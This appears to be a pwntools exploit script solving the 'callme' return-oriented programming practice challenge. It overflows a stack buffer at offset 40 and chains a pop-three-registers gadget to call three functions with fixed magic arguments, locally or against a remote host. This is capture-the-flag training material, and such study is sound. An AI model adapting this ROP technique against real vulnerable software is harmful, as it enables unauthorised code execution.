from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


exe = './callme'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']
pop3 = ROP(elf).find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]

payload = flat({
    40: [
    	pop3,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callme_one,
    pop3,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callme_two,
    pop3,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callme_three
    ]
})
io = start()
# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('', payload)

io.recvuntil('callme_two() called correctly\n')
print(io.recvline())